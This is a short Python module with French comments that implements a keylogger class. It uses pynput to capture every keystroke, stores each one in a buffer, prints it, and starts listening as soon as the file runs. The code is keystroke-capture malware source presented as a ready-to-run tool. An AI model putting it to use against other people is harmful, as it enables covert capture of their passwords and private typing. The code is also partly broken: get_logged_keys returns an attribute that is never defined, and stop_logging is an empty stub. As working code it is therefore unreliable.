from pynput import keyboard
from IKeyLogger import IKeyLogger
from Buffer import Buffer


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.buffer= Buffer()

    def on_press(self, key):
        """ Fonction appelée à chaque pression de touche """
        self.buffer.add_data(str(key))# Ajouter la touche à la liste
        print(f"Touche appuyée : {key}")  # Affichage en temps réel

    def start_logging(self):
        """ Démarre l'écoute du clavier """
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()  # Bloque le programme pour écouter les frappes

    def stop_logging(self):
        """ Arrêter l'écoute du clavier """
        pass  # Ici, tu peux définir une logique pour arrêter l'écoute si nécessaire

    def get_logged_keys(self):
        """ Retourne la liste des touches enregistrées """
        return self.touche_log


# Utilisation de la classe
keylogger = KeyLoggerService()
keylogger.start_logging()  # Démarrer l'écoute
